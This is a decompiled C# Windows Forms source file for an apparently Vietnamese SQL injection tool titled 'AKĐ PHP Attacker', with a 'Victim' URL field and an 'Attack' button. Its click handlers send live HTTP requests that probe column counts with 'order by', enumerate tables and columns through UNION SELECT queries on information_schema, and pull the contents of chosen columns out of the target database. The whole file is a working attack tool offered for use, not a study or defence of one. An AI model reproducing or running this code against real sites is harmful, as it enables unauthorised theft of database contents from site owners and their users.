using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Net;
using System.Windows.Forms;

namespace SQLINJECT2;

public class PHPMainForm : Form
{
	private IContainer components = null;

	private Label label1;

	private TextBox textBox1;

	private TextBox textBox2;

	private Button button1;

	private ListBox listBox1;

	private WebBrowser webBrowser1;

	private TextBox textBox3;

	private Button button2;

	private Label label2;

	private Button button3;

	private CheckedListBox checkedListBox1;

	private GroupBox groupBox1;

	private RichTextBox richTextBox1;

	private Button button4;

	private Label label3;

	private RichTextBox richTextBox2;

	private Button button5;

	private Label label4;

	private string column = "";

	private string thongbao1 = "/:|";

	private string thongbao2 = "\\|";

	private string table;

	private string select = "";

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Expected O, but got Unknown
		//IL_009b: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a5: Expected O, but got Unknown
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		//IL_00b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bb: Expected O, but got Unknown
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c6: Expected O, but got Unknown
		//IL_00fa: Unknown result type (might be due to invalid IL or missing references)
		//IL_0104: Expected O, but got Unknown
		//IL_078a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0794: Expected O, but got Unknown
		label1 = new Label();
		textBox1 = new TextBox();
		textBox2 = new TextBox();
		button1 = new Button();
		listBox1 = new ListBox();
		webBrowser1 = new WebBrowser();
		textBox3 = new TextBox();
		button2 = new Button();
		label2 = new Label();
		button3 = new Button();
		checkedListBox1 = new CheckedListBox();
		groupBox1 = new GroupBox();
		richTextBox2 = new RichTextBox();
		button5 = new Button();
		richTextBox1 = new RichTextBox();
		button4 = new Button();
		label3 = new Label();
		label4 = new Label();
		((Control)groupBox1).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)163));
		((Control)label1).set_Location(new Point(2, 64));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(49, 13));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("Victim :");
		((Control)textBox1).set_Location(new Point(58, 56));
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(339, 20));
		((Control)textBox1).set_TabIndex(1);
		((Control)textBox2).set_Location(new Point(403, 56));
		((Control)textBox2).set_Name("textBox2");
		((Control)textBox2).set_Size(new Size(126, 20));
		((Control)textBox2).set_TabIndex(2);
		((Control)button1).set_Location(new Point(535, 54));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(93, 23));
		((Control)button1).set_TabIndex(3);
		((Control)button1).set_Text("Attack");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((ListControl)listBox1).set_FormattingEnabled(true);
		((Control)listBox1).set_Location(new Point(5, 289));
		((Control)listBox1).set_Name("listBox1");
		((Control)listBox1).set_Size(new Size(120, 173));
		((Control)listBox1).set_TabIndex(4);
		((Control)webBrowser1).set_Location(new Point(5, 87));
		((Control)webBrowser1).set_MinimumSize(new Size(20, 20));
		((Control)webBrowser1).set_Name("webBrowser1");
		((Control)webBrowser1).set_Size(new Size(655, 144));
		((Control)webBrowser1).set_TabIndex(5);
		((Control)textBox3).set_Location(new Point(123, 234));
		((Control)textBox3).set_Name("textBox3");
		((Control)textBox3).set_Size(new Size(54, 20));
		((Control)textBox3).set_TabIndex(6);
		((Control)button2).set_Location(new Point(5, 264));
		((Control)button2).set_Name("button2");
		((Control)button2).set_Size(new Size(120, 23));
		((Control)button2).set_TabIndex(7);
		((Control)button2).set_Text("Get Table");
		((ButtonBase)button2).set_UseVisualStyleBackColor(true);
		((Control)button2).add_Click((EventHandler)button2_Click);
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Location(new Point(2, 241));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(115, 13));
		((Control)label2).set_TabIndex(8);
		((Control)label2).set_Text("Chọn số để khai thác :");
		((Control)button3).set_Location(new Point(146, 264));
		((Control)button3).set_Name("button3");
		((Control)button3).set_Size(new Size(120, 23));
		((Control)button3).set_TabIndex(10);
		((Control)button3).set_Text("Get Column");
		((ButtonBase)button3).set_UseVisualStyleBackColor(true);
		((Control)button3).add_Click((EventHandler)button3_Click);
		((ListControl)checkedListBox1).set_FormattingEnabled(true);
		((Control)checkedListBox1).set_Location(new Point(146, 289));
		((Control)checkedListBox1).set_Name("checkedListBox1");
		((Control)checkedListBox1).set_Size(new Size(120, 169));
		((Control)checkedListBox1).set_TabIndex(12);
		((Control)groupBox1).get_Controls().Add((Control)(object)richTextBox2);
		((Control)groupBox1).get_Controls().Add((Control)(object)button5);
		((Control)groupBox1).get_Controls().Add((Control)(object)richTextBox1);
		((Control)groupBox1).set_Location(new Point(312, 264));
		((Control)groupBox1).set_Name("groupBox1");
		((Control)groupBox1).set_Size(new Size(348, 198));
		((Control)groupBox1).set_TabIndex(13);
		groupBox1.set_TabStop(false);
		((Control)groupBox1).set_Text("Query Builder");
		((Control)richTextBox2).set_Location(new Point(172, 19));
		((Control)richTextBox2).set_Name("richTextBox2");
		((Control)richTextBox2).set_Size(new Size(170, 175));
		((Control)richTextBox2).set_TabIndex(3);
		((Control)richTextBox2).set_Text("");
		((Control)button5).set_Location(new Point(6, 171));
		((Control)button5).set_Name("button5");
		((Control)button5).set_Size(new Size(75, 23));
		((Control)button5).set_TabIndex(1);
		((Control)button5).set_Text("Select");
		((ButtonBase)button5).set_UseVisualStyleBackColor(true);
		((Control)button5).add_Click((EventHandler)button5_Click);
		((Control)richTextBox1).set_Location(new Point(6, 19));
		((Control)richTextBox1).set_Name("richTextBox1");
		((Control)richTextBox1).set_Size(new Size(160, 146));
		((Control)richTextBox1).set_TabIndex(0);
		((Control)richTextBox1).set_Text("");
		((Control)button4).set_Location(new Point(273, 346));
		((Control)button4).set_Name("button4");
		((Control)button4).set_Size(new Size(33, 23));
		((Control)button4).set_TabIndex(14);
		((Control)button4).set_Text(">>>");
		((ButtonBase)button4).set_UseVisualStyleBackColor(true);
		((Control)button4).add_Click((EventHandler)button4_Click);
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Font(new Font("Microsoft Sans Serif", 25f, (FontStyle)1, (GraphicsUnit)3, (byte)163));
		((Control)label3).set_ForeColor(Color.Red);
		((Control)label3).set_Location(new Point(176, 9));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(299, 39));
		((Control)label3).set_TabIndex(15);
		((Control)label3).set_Text("AKĐ PHP Attaker");
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_Location(new Point(183, 241));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(107, 13));
		((Control)label4).set_TabIndex(16);
		((Control)label4).set_Text("(Số hiển thị trên web)");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(664, 466));
		((Control)this).get_Controls().Add((Control)(object)label4);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)button4);
		((Control)this).get_Controls().Add((Control)(object)groupBox1);
		((Control)this).get_Controls().Add((Control)(object)checkedListBox1);
		((Control)this).get_Controls().Add((Control)(object)button3);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)button2);
		((Control)this).get_Controls().Add((Control)(object)textBox3);
		((Control)this).get_Controls().Add((Control)(object)webBrowser1);
		((Control)this).get_Controls().Add((Control)(object)listBox1);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)textBox2);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).set_Name("PHPMainForm");
		((Control)this).set_Text("AKĐ PHP Attacker");
		((Form)this).add_Load((EventHandler)PHPMainForm_Load);
		((Control)groupBox1).ResumeLayout(false);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	public PHPMainForm()
	{
		InitializeComponent();
	}

	private void PHPMainForm_Load(object sender, EventArgs e)
	{
		((Control)textBox1).set_Text(MainForm.address1);
		((Control)textBox2).set_Text(MainForm.address2);
	}

	private void button1_Click(object sender, EventArgs e)
	{
		LoadForm loadForm = new LoadForm();
		((Control)loadForm).Show();
		string requestUriString = ((Control)textBox1).get_Text() + " order by 1000/*" + ((Control)textBox2).get_Text();
		HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(requestUriString);
		string text = new StreamReader(httpWebRequest.GetResponse().GetResponseStream()).ReadToEnd();
		int num = 0;
		int num2 = 100;
		while (num2 > 0)
		{
			requestUriString = ((Control)textBox1).get_Text() + " order by " + num2 + "/*" + ((Control)textBox2).get_Text();
			httpWebRequest = (HttpWebRequest)WebRequest.Create(requestUriString);
			string text2 = new StreamReader(httpWebRequest.GetResponse().GetResponseStream()).ReadToEnd();
			if (!(text2 != text))
			{
				num2--;
				continue;
			}
			num = num2;
			break;
		}
		for (int i = 1; i <= num; i++)
		{
			column = column + i + ",";
		}
		column = column.Substring(0, Convert.ToInt32(column.Length) - 1);
		webBrowser1.Navigate(((Control)textBox1).get_Text() + " union select " + column + " /*");
		MainForm.load = 1;
	}

	private void button2_Click(object sender, EventArgs e)
	{
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)textBox3).get_Text() == "")
		{
			MessageBox.Show("Bạn chưa chọn số để khai thác");
			return;
		}
		table = "";
		LoadForm loadForm = new LoadForm();
		((Control)loadForm).Show();
		listBox1.get_Items().Clear();
		int num = 0;
		num = column.IndexOf(((Control)textBox3).get_Text());
		string text = column.Substring(0, num);
		string text2 = column.Substring(num + Convert.ToInt32(((Control)textBox3).get_Text().Length), Convert.ToInt32(column.Length) - Convert.ToInt32(text.Length) - Convert.ToInt32(((Control)textBox3).get_Text().Length));
		int num2 = 0;
		while (true)
		{
			if (num2 != 1)
			{
				if (num2 > 1)
				{
					table = table + " and table_name != %22" + listBox1.get_Items().get_Item(num2 - 1).ToString() + "%22";
				}
			}
			else
			{
				table = " where table_name != %22" + listBox1.get_Items().get_Item(0).ToString() + "%22";
			}
			string requestUriString = ((Control)textBox1).get_Text() + " union select " + text + "concat(char(47),char(58),char(124),table_name,char(92),char(92),char(124))" + text2 + " from information_schema.columns" + table + ((Control)textBox2).get_Text();
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(requestUriString);
			string text3 = new StreamReader(httpWebRequest.GetResponse().GetResponseStream()).ReadToEnd();
			int num3 = Convert.ToInt32(text3.IndexOf(thongbao1)) + 3;
			int length = Convert.ToInt32(text3.IndexOf(thongbao2)) - num3 - 1;
			if (num3 == 2)
			{
				break;
			}
			listBox1.get_Items().Add((object)text3.Substring(num3, length));
			num2++;
		}
		MainForm.load = 1;
	}

	private void button3_Click(object sender, EventArgs e)
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		if (Convert.ToInt32(listBox1.get_Items().get_Count()) == 0)
		{
			MessageBox.Show("Bạn chưa lấy table nào");
			return;
		}
		table = "";
		LoadForm loadForm = new LoadForm();
		((Control)loadForm).Show();
		((ObjectCollection)checkedListBox1.get_Items()).Clear();
		int num = 0;
		num = column.IndexOf(((Control)textBox3).get_Text());
		string text = column.Substring(0, num);
		string text2 = column.Substring(num + Convert.ToInt32(((Control)textBox3).get_Text().Length), Convert.ToInt32(column.Length) - Convert.ToInt32(text.Length) - Convert.ToInt32(((Control)textBox3).get_Text().Length));
		int num2 = 0;
		while (true)
		{
			if (num2 > 0)
			{
				table = table + " and column_name != %22" + ((ObjectCollection)checkedListBox1.get_Items()).get_Item(num2 - 1).ToString() + "%22";
			}
			string requestUriString = ((Control)textBox1).get_Text() + " union select " + text + "concat(char(47),char(58),char(124),column_name,char(92),char(92),char(124))" + text2 + " from information_schema.columns where table_name = %22" + ((Control)listBox1).get_Text() + "%22" + table + ((Control)textBox2).get_Text();
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(requestUriString);
			string text3 = new StreamReader(httpWebRequest.GetResponse().GetResponseStream()).ReadToEnd();
			int num3 = Convert.ToInt32(text3.IndexOf(thongbao1)) + 3;
			int length = Convert.ToInt32(text3.IndexOf(thongbao2)) - num3 - 1;
			if (num3 == 2)
			{
				break;
			}
			((ObjectCollection)checkedListBox1.get_Items()).Add((object)text3.Substring(num3, length));
			num2++;
		}
		MainForm.load = 1;
	}

	private void button4_Click(object sender, EventArgs e)
	{
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		if (checkedListBox1.get_CheckedItems().get_Count() == 0)
		{
			MessageBox.Show("Bạn phải tick vào 1 trường");
			return;
		}
		select = "";
		string text = "";
		for (int i = 0; i <= checkedListBox1.get_CheckedItems().get_Count() - 1; i++)
		{
			select = select + checkedListBox1.get_CheckedItems().get_Item(i).ToString() + ", char(124), ";
			text = text + checkedListBox1.get_CheckedItems().get_Item(i).ToString() + ", ";
		}
		text = text.Substring(0, Convert.ToInt32(text.Length) - 2);
		select = select.Substring(0, Convert.ToInt32(select.Length) - 13);
		((Control)richTextBox1).set_Text("select " + text + " from " + ((Control)listBox1).get_Text());
	}

	private void button5_Click(object sender, EventArgs e)
	{
		//IL_010f: Unknown result type (might be due to invalid IL or missing references)
		LoadForm loadForm = new LoadForm();
		((Control)loadForm).Show();
		((Control)richTextBox2).set_Text("");
		int num = 0;
		num = column.IndexOf(((Control)textBox3).get_Text());
		string text = column.Substring(0, num);
		string text2 = column.Substring(num + Convert.ToInt32(((Control)textBox3).get_Text().Length), Convert.ToInt32(column.Length) - Convert.ToInt32(text.Length) - Convert.ToInt32(((Control)textBox3).get_Text().Length));
		string requestUriString;
		if (Convert.ToInt32(((Control)richTextBox1).get_Text().IndexOf("where")) != -1)
		{
			string text3 = ((Control)richTextBox1).get_Text().Substring(((Control)richTextBox1).get_Text().IndexOf("where"), Convert.ToInt32(((Control)richTextBox1).get_Text().Length) - ((Control)richTextBox1).get_Text().IndexOf("where"));
			MessageBox.Show(text3);
			requestUriString = ((Control)textBox1).get_Text() + " union select " + text + "concat(char(47),char(58),char(124)," + select + ",char(92),char(92),char(124))" + text2 + " from " + ((Control)listBox1).get_Text() + " " + text3 + "/*" + ((Control)textBox2).get_Text();
		}
		else
		{
			requestUriString = ((Control)textBox1).get_Text() + " union select " + text + "concat(char(47),char(58),char(124)," + select + ",char(92),char(92),char(124))" + text2 + " from " + ((Control)listBox1).get_Text() + "/*" + ((Control)textBox2).get_Text();
		}
		HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(requestUriString);
		string text4 = new StreamReader(httpWebRequest.GetResponse().GetResponseStream()).ReadToEnd();
		int num2 = Convert.ToInt32(text4.IndexOf(thongbao1)) + 3;
		int length = Convert.ToInt32(text4.IndexOf(thongbao2)) - num2 - 1;
		if (num2 != 2)
		{
			string[] array = text4.Substring(num2, length).Split(new char[1] { '|' });
			for (int i = 0; i < checkedListBox1.get_CheckedItems().get_Count(); i++)
			{
				RichTextBox obj = richTextBox2;
				object text5 = ((Control)obj).get_Text();
				((Control)obj).set_Text(string.Concat(text5, checkedListBox1.get_CheckedItems().get_Item(i), " : ", array[i], "\n"));
			}
		}
		MainForm.load = 1;
	}
}
